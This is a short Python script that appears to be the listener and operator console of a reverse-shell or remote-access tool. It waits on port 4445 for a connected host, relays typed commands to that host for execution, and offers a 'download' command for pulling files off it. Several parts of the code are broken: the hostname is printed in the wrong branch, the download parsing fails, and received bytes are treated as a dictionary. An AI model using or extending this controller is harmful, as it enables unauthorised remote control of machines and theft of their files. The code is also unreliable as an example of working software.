import socket
from console import print_result
from base64 import b64decode


server = socket.socket()
server.bind(('0.0.0.0', 4445))
server.listen(5)
print('Waiting for connection ...')
conn, addr = server.accept()
connection = conn
try:
    hostname = conn.recv(1024)
except Exception:
    print('Established connection with (%s, %s)' % (addr[0], hostname.decode('utf-8')))

while True:
    command = input('>> ')

    if command == 'show session':
        print('Hostname: %s, addr: %s' % (hostname.decode('utf-8'), addr[0]))
    elif command == 'download':
        print('Downloading file at %s' % command.split(' ')[1])
        response = connection.recv(1024)
        if response['status'] == 'OK':
            with open('downloaded_file', 'wb') as file:
                file.write(b64decode(response['data']))
        else:
            print('Downloading file failed')
    else:
        connection.send(bytes(command, encoding='utf-8'))
        print_result(connection.recv(1024).decode('utf-8'))

